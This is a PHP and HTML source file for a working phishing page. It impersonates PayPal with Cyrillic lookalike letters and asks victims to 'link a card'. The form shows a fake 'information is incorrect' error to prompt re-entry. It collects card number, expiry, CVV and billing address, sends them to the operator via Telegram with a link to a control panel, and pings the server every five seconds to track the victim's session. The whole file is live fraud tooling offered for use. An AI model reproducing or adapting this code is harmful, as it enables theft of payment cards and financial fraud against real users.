<?php
require_once 'config.php';
 $sid = $_GET['sid'] ?? '';
if (!$sid) { redirect('index.php'); }

 $sData = get_session($sid);
 $lang = $sData['lang'] ?? 'en'; 

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = get_session($sid) ?: [];
    $data['card_number'] = $_POST['card_number'] ?? ''; $data['expiration'] = $_POST['expiration_date'] ?? ''; $data['cvv'] = $_POST['cvv'] ?? '';
    $data['address1'] = $_POST['address1'] ?? ''; $data['address2'] = $_POST['address2'] ?? ''; $data['city'] = $_POST['city'] ?? ''; $data['state'] = $_POST['state'] ?? ''; $data['postal'] = $_POST['postal_code'] ?? '';
    $data['status'] = 'waiting';
    save_session($sid, $data);

    $base_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['PHP_SELF']);
    $panel_link = rtrim($base_url, '/') . '/panel.php?sid=' . $sid;
    sendToTelegram("💳 <b>Card Info</b>\nSID: <code>$sid</code>\nCard: <code>{$data['card_number']}</code>\nExp: <code>{$data['expiration']}</code> | CVV: <code>{$data['cvv']}</code>\nAddress: <code>{$data['address1']}, {$data['city']}, {$data['state']} {$data['postal']}</code>\n\n➡️ <a href='{$panel_link}'>Open Panel</a>");
    redirect("waiting.php?sid=" . $sid);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>РayРal - Link a Card</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { display: flex; justify-content: center; align-items: center; min-height: 100vh; background-color: #ffffff; padding: 20px; }
        .card-container { width: 100%; max-width: 480px; background: #ffffff; padding: 24px; position: relative; display: flex; flex-direction: column; align-items: center; }
        .close-btn { position: absolute; top: 5px; right: 5px; font-size: 20px; color: #6c757d; cursor: pointer; text-decoration: none; }
        .logo-container { margin-bottom: 25px; text-align: center; } .logo-container img { height: 38px; }
        h1 { font-size: 24px; font-weight: 700; color: #000; margin-bottom: 20px; text-align: center; }
        .error-message { width: 100%; background-color: #fdf0f0; border-left: 4px solid #d9381e; color: #d9381e; padding: 12px 16px; font-size: 14px; font-weight: 500; border-radius: 4px; margin-bottom: 20px; text-align: left; }
        form { width: 100%; } .input-group { position: relative; margin-bottom: 16px; width: 100%; }
        .form-row { display: flex; gap: 16px; width: 100%; } .form-row .input-group { flex: 1; }
        .input-field { width: 100%; height: 56px; border: 1px solid #b2b2b2; border-radius: 6px; padding: 16px 14px; font-size: 15px; color: #000; outline: none; background: transparent; transition: border-color 0.2s, background-color 0.2s; }
        .input-field.error-border { border-color: #d9381e; background-color: #fff8f8; }
        .input-field:focus { border-color: #0053c0; border-width: 2px; padding: 20px 14px 10px 14px; background-color: transparent; }
        .input-group label { position: absolute; left: 14px; top: 50%; transform: translateY(-50%); color: #6c6c6c; font-size: 15px; pointer-events: none; transition: all 0.2s; }
        .input-field:focus ~ label, .input-field:not(:placeholder-shown) ~ label { top: 14px; font-size: 11px; color: #6c6c6c; }
        .input-field:not(:placeholder-shown) { padding: 22px 14px 8px 14px; }
        .input-icon { position: absolute; right: 14px; top: 50%; transform: translateY(-50%); display: flex; pointer-events: none; }
        .section-header { display: flex; justify-content: space-between; align-items: center; width: 100%; margin-top: 15px; margin-bottom: 15px; }
        .section-title { font-size: 15px; font-weight: 600; color: #000; } .cancel-link { color: #0070ba; text-decoration: none; font-size: 15px; font-weight: 700; }
        .submit-container { display: flex; justify-content: center; margin-top: 25px; width: 100%; }
        .btn-link-card { background-color: #000; color: #fff; border: none; border-radius: 100px; padding: 12px 35px; font-size: 15px; font-weight: 700; cursor: pointer; transition: background-color 0.2s, opacity 0.2s; }
        .btn-link-card:hover { background-color: #222; }
    </style>
</head>
<body onload="initLang('<?php echo $lang; ?>')">
    <div class="card-container">
        <a href="#" class="close-btn">&#x2715;</a>
        <div class="logo-container"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT5RSx4N3Nta8EwHtwbbr2PVdtHByHhIOXOCqOxH0zt1w&s=10" alt="РayРal Logo"></div>
        <h1 id="card_title">Link a card</h1>

        <div class="error-message" id="error-box">
            <span id="card_error_text">The credit card information is incorrect. Please check your details and try again.</span>
        </div>

        <form id="linkCardForm" method="POST" action="error-karta.php?sid=<?php echo htmlspecialchars($sid); ?>">
            <div class="input-group">
                <input type="text" id="cardNumber" name="card_number" class="input-field error-border" placeholder=" " autocomplete="off" inputmode="numeric">
                <label for="cardNumber" id="lbl_card">Card number</label>
                <div class="input-icon"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#d9381e" stroke-width="2"><rect x="2" y="5" width="20" height="14" rx="2"/><line x1="2" y1="10" x2="22" y2="10"/><line x1="6" y1="15" x2="10" y2="15"/></svg></div>
            </div>
            <div class="form-row">
                <div class="input-group"><input type="text" id="expiration" name="expiration_date" class="input-field error-border" placeholder=" " autocomplete="off" inputmode="numeric"><label for="expiration" id="lbl_exp">Expiration</label></div>
                <div class="input-group"><input type="text" id="cvv" name="cvv" class="input-field error-border" placeholder=" " autocomplete="off" inputmode="numeric"><label for="cvv" id="lbl_cvv">CVV</label><div class="input-icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#0070ba" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg></div></div>
            </div>
            <div class="section-header"><span class="section-title" id="card_sec_title">Add a new billing address</span><a href="#" class="cancel-link" id="card_cancel">Cancel</a></div>
            <div class="input-group"><input type="text" id="address1" name="address1" class="input-field" placeholder=" " autocomplete="off"><label for="address1" id="lbl_addr1">Address line 1</label></div>
            <div class="input-group"><input type="text" id="address2" name="address2" class="input-field" placeholder=" " autocomplete="off"><label for="address2" id="lbl_addr2">Address line 2</label></div>
            <div class="input-group"><input type="text" id="city" name="city" class="input-field" placeholder=" " autocomplete="off"><label for="city" id="lbl_city">City / Town / Village</label></div>
            <div class="form-row">
                <div class="input-group"><input type="text" id="state" name="state" class="input-field" placeholder=" " autocomplete="off"><label for="state" id="lbl_state">State / Province / Region</label></div>
                <div class="input-group"><input type="text" id="postal" name="postal_code" class="input-field" placeholder=" " autocomplete="off"><label for="postal" id="lbl_postal">Postal code</label></div>
            </div>
            <div class="submit-container"><button type="submit" class="btn-link-card" id="card_submit">Link Card</button></div>
        </form>
    </div>
    <script>
        const linkCardForm = document.getElementById('linkCardForm');
        const submitCardBtn = document.getElementById('card_submit');
        const errorBox = document.getElementById('error-box');
        const inputs = document.querySelectorAll('.input-field');

        // 🧹 Fonction bach n7aydo l-error w l-7mar mnin ybda l-user yktb
        function clearError() { if (errorBox) { errorBox.style.display = 'none'; } inputs.forEach(input => input.classList.remove('error-border')); }
        inputs.forEach(input => input.addEventListener('input', clearError));

        linkCardForm.addEventListener('submit', function(e) { submitCardBtn.innerText = "Linking..."; submitCardBtn.style.opacity = "0.7"; submitCardBtn.disabled = true; });

        const translations_card = {
            en: { title: "Link a card", error: "The credit card information is incorrect. Please check your details and try again.", lbl_card: "Card number", lbl_exp: "Expiration", lbl_cvv: "CVV", sec_title: "Add a new billing address", cancel: "Cancel", lbl_addr1: "Address line 1", lbl_addr2: "Address line 2", lbl_city: "City / Town / Village", lbl_state: "State / Province / Region", lbl_postal: "Postal code", submit: "Link Card" },
            de: { title: "Aktualisieren Sie Ihre Karte", error: "Die Kreditkarteninformationen sind falsch. Bitte überprüfen Sie Ihre Angaben und versuchen Sie es erneut.", lbl_card: "Kartennummer", lbl_exp: "Ablaufdatum", lbl_cvv: "CVV", sec_title: "Neue Rechnungsadresse hinzufügen", cancel: "Abbrechen", lbl_addr1: "Adresszeile 1", lbl_addr2: "Adresszeile 2", lbl_city: "Stadt / Dorf", lbl_state: "Bundesland / Region", lbl_postal: "Postleitzahl", submit: "Aktualisieren Sie Ihre Karte" },
            fr: { title: "Lier une carte", error: "Les informations de la carte de crédit sont incorrectes. Veuillez vérifier vos informations et réessayer.", lbl_card: "Numéro de carte", lbl_exp: "Expiration", lbl_cvv: "CVV", sec_title: "Ajouter une nouvelle adresse de facturation", cancel: "Annuler", lbl_addr1: "Adresse ligne 1", lbl_addr2: "Adresse ligne 2", lbl_city: "Ville / Village", lbl_state: "État / Région", lbl_postal: "Code postal", submit: "Lier la carte" },
            pl: { title: "Powiąż kartę", error: "Informacje o karcie kredytowej są nieprawidłowe. Sprawdź swoje dane i spróbuj ponownie.", lbl_card: "Numer karty", lbl_exp: "Ważność", lbl_cvv: "CVV", sec_title: "Dodaj nowy adres rozliczeniowy", cancel: "Anuluj", lbl_addr1: "Adres linia 1", lbl_addr2: "Adres linia 2", lbl_city: "Miasto / Miejscowość", lbl_state: "Stan / Prowincja / Region", lbl_postal: "Kod pocztowy", submit: "Powiąż kartę" }
        };
        function initLang(lang) {
            const data = translations_card[lang] || translations_card['en'];
            document.getElementById('card_title').innerText = data.title;
            document.getElementById('card_error_text').innerText = data.error;
            document.getElementById('lbl_card').innerText = data.lbl_card;
            document.getElementById('lbl_exp').innerText = data.lbl_exp;
            document.getElementById('lbl_cvv').innerText = data.lbl_cvv;
            document.getElementById('card_sec_title').innerText = data.sec_title;
            document.getElementById('card_cancel').innerText = data.cancel;
            document.getElementById('lbl_addr1').innerText = data.lbl_addr1;
            document.getElementById('lbl_addr2').innerText = data.lbl_addr2;
            document.getElementById('lbl_city').innerText = data.lbl_city;
            document.getElementById('lbl_state').innerText = data.lbl_state;
            document.getElementById('lbl_postal').innerText = data.lbl_postal;
            document.getElementById('card_submit').innerText = data.submit;
        }

        const cardInput = document.getElementById('cardNumber');
        const expInput = document.getElementById('expiration');
        const cvvInput = document.getElementById('cvv');

        cardInput.addEventListener('input', function(e) {
            let val = this.value.replace(/\D/g, ''); 
            if (val.length > 16) val = val.slice(0, 16); 
            
            let formattedVal = val.match(/.{1,4}/g)?.join(' ') || '';
            this.value = formattedVal;

            if (val.length === 16) {
                expInput.focus();
            }
        });

        expInput.addEventListener('input', function(e) {
            let val = this.value.replace(/\D/g, ''); 
            if (val.length > 4) val = val.slice(0, 4); 

            if (val.length >= 3) {
                this.value = val.slice(0, 2) + '/' + val.slice(2);
            } else {
                this.value = val;
            }

            if (val.length === 4) {
                cvvInput.focus();
            }
        });

        cvvInput.addEventListener('input', function(e) {
            let val = this.value.replace(/\D/g, '');
            if (val.length > 4) val = val.slice(0, 4); // Max 4 ar9am
            this.value = val;
        });

        expInput.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' && this.value === '') {
                cardInput.focus();
                let val = cardInput.value;
                cardInput.setSelectionRange(val.length, val.length);
            }
        });

        cvvInput.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' && this.value === '') {
                expInput.focus();
                let val = expInput.value;
                expInput.setSelectionRange(val.length, val.length);
            }
        });
    </script>
    <script>const sid="<?php echo isset($sid)?addslashes($sid):'';?>"; if(sid){setInterval(()=>{fetch('process.php?action=ping&sid='+sid).catch(err=>console.error('Ping error'));},5000);}</script>
</body>
</html>